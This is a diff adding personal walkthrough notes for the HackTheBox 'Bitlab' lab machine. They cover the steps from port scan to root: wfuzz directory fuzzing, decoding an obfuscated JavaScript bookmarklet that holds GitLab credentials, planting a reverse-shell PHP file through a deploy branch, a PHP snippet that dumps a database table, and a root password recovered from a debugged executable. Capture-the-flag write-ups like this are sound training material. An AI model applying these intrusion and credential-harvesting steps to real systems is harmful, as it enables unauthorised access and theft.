@@ -1,0 +1,75 @@
+# Recon
+## comm tcp
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+## all tcp
+same
+
+# Enum
+# 80 http
+a gitlab site.
+(get hint) don't bf. Try wfuzz first and patient.
+wfuzz -u 'http://bitlab.htb/FUZZ/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -c -t 5 --hc 302
+=>/profile
+
+/profile
+a website of Clave
+
+/help/bookmarks.html, the "gitlab login" cannot be clicked.
+rtfsc=>javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
+=> clave:11des0081x
+=> login gitlab.
+
+find two projects, one is the profile we found. The other is called "deployer", tried with /deployer => ok.
+read deployers code, craft the post request it wants => successfully pulled /profile
+add rev.php to /profile in gitlab and let it pull again.
+interestingly, I cannot modify master branch directly but I can add files to "test-deploy" branch and ask for merge to master and manually merge.
+=> foothold
+
+o Priv Esc
+# www-data -> clave
+tried clave with 11des0081x, no
+sudo -l => (root) NOPASSWD: /usr/bin/git pull
+
+somehow there is port 3022, nc => ssh => .git/config => for git
+the banner is different than nc 22 from kali.
+clave has a RemoteConnection.exe, why exe?
+
+find /tmp/tmux-33, owner www-data
+looks like we are in a docker container.
+
+(get hint) visit gitlab snippet=>
+$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
+$result = pg_query($db_connection, "SELECT * FROM profiles");
+
+use this to extract the data
+<?php
+$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles"); 
+$result = pg_query($db_connection, "SELECT * FROM profiles");
+print_r(pg_fetch_all($result));
+?>
+=>
+[username] => clave
+[password] => c3NoLXN0cjBuZy1wQHNz==
+
+base64 -d => ssh-str0ng-p@ssbase64: invalid input
+so tried with the password directly => ok
+
+# clave -> root
+What is this RemoteConnection.exe
+(get hint) too hard for me now, need x64dbg to debug it in windows.
+x64dbg => -ssh root@gitlab.htb -pw \"Qf7]8YSV.wDNF*[7d?j&eD4^\"
+=> root
